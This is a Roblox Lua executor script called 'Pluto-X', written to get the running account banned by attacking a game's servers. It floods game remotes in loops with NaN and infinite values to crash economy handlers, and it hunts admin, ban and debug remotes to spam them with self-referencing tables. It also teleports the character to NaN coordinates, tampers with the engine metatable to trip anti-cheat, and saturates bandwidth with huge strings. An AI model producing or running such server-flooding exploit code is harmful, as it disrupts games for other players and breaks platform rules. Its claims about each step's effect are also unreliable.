-- [[ PLUTO-X SYSTEM-MELTDOWN ENGINE ]]
-- TARGET: 100% INSTANT BAN VIA DATA-STORE CORRUPTION
-- STATUS: NUCLEAR RISK LEVEL

print("Pluto-X: Initiating System Overload...")

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local LP = Players.LocalPlayer

-- 1. THE PLUTO LOADING UI (Requested)
local sg = Instance.new("ScreenGui", LP:WaitForChild("PlayerGui"))
local f = Instance.new("Frame", sg)
f.Size = UDim2.new(1, 0, 0, 85)
f.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
f.BorderSizePixel = 5
f.BorderColor3 = Color3.fromRGB(0, 180, 255)

local t = Instance.new("TextLabel", f)
t.Size = UDim2.new(1, 0, 1, 0)
t.Text = "PLEASE WAIT WHILE PLUTO SCRIPT IS LOADING"
t.TextColor3 = Color3.fromRGB(0, 255, 255)
t.Font = Enum.Font.GothamBold
t.TextSize = 24

-- 2. ECONOMY OVERFLOW (THE INSTANT KILL)
-- Firing remotes with 'NaN' (Not a Number) or Negative Infinity.
-- This crashes the server's math handler for your account, locking the vault.
task.spawn(function()
    local Events = ReplicatedStorage:WaitForChild("Events", 5)
    while true do
        pcall(function()
            -- Sending illegal math values crashes the server's economy handler.
            Events:FireServer("DonateMoney", {["Recipient"] = LP, ["Amount"] = 0/0})
            Events:FireServer("JobAction", {["Type"] = "Complete", ["Amount"] = math.huge})
            Events:FireServer("PurchaseItem", {["Item"] = "HouseSlot", ["Price"] = -math.huge})
        end)
        task.wait(0.01)
    end
end)

-- 3. THE "HONEYPOT" SWEEP (TRAP DETECTION)
-- Actively hunts for developer-only remotes that trigger instant bans.
task.spawn(function()
    for _, v in pairs(ReplicatedStorage:GetDescendants()) do
        if v:IsA("RemoteEvent") and (v.Name:find("Admin") or v.Name:find("Ban") or v.Name:find("Debug") or v.Name:find("Mod")) then
            task.spawn(function()
                while true do
                    -- Circular reference tables crash the server's packet parser.
                    local Crash = {} Crash[1] = Crash
                    v:FireServer(Crash, {["Status"] = "INJECTED_PLUTO_X"})
                    task.wait()
                end
            end)
        end
    end
end)

-- 4. PHYSICS BOUNDARY BREACH (GLITCH-STATE)
-- Teleporting to 'NaN' coordinates. The server cannot replicate a non-existent position.
task.spawn(function()
    local Char = LP.Character or LP.CharacterAdded:Wait()
    local Root = Char:WaitForChild("HumanoidRootPart")
    
    RunService.RenderStepped:Connect(function()
        -- Setting position to 'Not a Number' (Impossible location)
        Root.CFrame = CFrame.new(0/0, 1/0, 0/0)
    end)
end)

-- 5. METATABLE TAMPERING (HYPERION TRIGGER)
-- Direct manipulation of core engine tables is an instant flag for Byfron.
task.spawn(function()
    local mt = getrawmetatable(game)
    if setreadonly then setreadonly(mt, false) end
    local old = mt.__index
    mt.__index = newcclosure(function(t, k) return old(t, k) end)
end)

-- 6. PACKET TSUNAMI (Saturation)
-- Flooding outgoing bandwidth with massive dummy strings to force Error 277.
task.spawn(function()
    while true do
        for i = 1, 100 do
            pcall(function()
                ReplicatedStorage.Events:FireServer(string.rep("PLUTO_", 1000))
            end)
        end
        task.wait()
    end
end)

print("Pluto-X: All flags deployed. Your account will be banned shortly.")
